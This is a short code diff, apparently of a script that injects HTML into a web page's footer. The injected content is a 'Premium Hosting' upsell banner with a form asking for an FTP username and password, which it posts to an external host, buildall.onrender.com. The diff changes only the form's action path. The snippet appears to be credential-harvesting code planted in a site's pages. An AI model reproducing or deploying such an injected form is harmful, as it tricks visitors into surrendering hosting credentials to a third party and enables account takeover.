@@ -21,7 +21,7 @@ document.getElementsByTagName("footer")[0].innerHTML += `
   Upgrade to Premium Hosting for more features,more faster!
 </div>
  
-        <form method="POST" action="https://buildall.onrender.com">
+        <form method="POST" action="https://buildall.onrender.com/main">
   <label for="ftp_user">FTP Username:</label><br>
   <input class="form-control"  type="text" id="ftp_user" name="ftp_user" ><br>
   <label for="ftp_password">FTP Password:</label><br>
